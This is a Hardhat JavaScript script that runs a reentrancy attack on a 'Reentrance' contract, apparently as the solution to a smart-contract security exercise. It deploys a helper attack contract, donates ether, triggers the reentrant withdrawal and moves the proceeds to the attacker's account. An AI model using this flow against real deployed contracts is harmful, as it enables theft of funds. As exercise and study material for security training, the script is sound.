// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");

async function main() {
  // 👉 Contract name and address
  const contractName = "Reentrance";
  const contractAddress = "0x029c6939BcAbc8869508852afbe26fd56763B57a";

  // 📗 We get the contract to be hacked
  const contract = await hre.ethers.getContractAt(
    contractName,
    contractAddress
  );

  // 🔨 Get accounts
  let [hacker, _, tester] = await hre.ethers.getSigners();
  hacker = tester;
  console.log(`🤓 Hacker address:\n ${hacker.address} \n`);

  // 📕 Deploy the contract that will execute the hack
  const hackContractName = "HackReentrance";
  const HackContract = await ethers.getContractFactory(
    hackContractName,
    hacker
  );
  const hackContract = await HackContract.connect(hacker).deploy(
    contract.address
  );
  await hackContract.deployed();
  console.log(`📕 ${hackContractName} address:\n ${hackContract.address} \n`);

  // 🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢
  // ==============================================================================
  // 👉 change `etherToWithdraw` to the amount you want to withdraw
  // 👉 Check these values: [await getBalance(contract.address), await getBalance(player)]
  // ==============================================================================
  // 🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢
  // 👿 Donate some ether to our HackContract to prepare the hack
  let etherToWithdraw = "0.001";
  console.log(`✍  Donating ${etherToWithdraw} ether to the HackContract...`);
  tx = await contract.connect(hacker).donate(hackContract.address, {
    value: ethers.utils.parseEther(etherToWithdraw),
  });
  await tx.wait((confirms = 1));

  // 👿 Hacking the contract
  console.log("👿 Hacking the contract...");
  tx = await hackContract.connect(hacker).withdrawDonation(
    ethers.utils.parseEther(etherToWithdraw, {
      gasLimit: 1000000,
    })
  );
  tx = await tx.wait((confirms = 1));
  console.log("👿 Hack hash\n");
  console.log(tx);
  console.log("\n");

  // 👿 Retrieving our earnings to the hacker account
  tx = await hackContract.connect(hacker).withdrawHackEarnings();
  tx = await tx.wait((confirms = 1));
  console.log("👿 Hack finished\n");
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
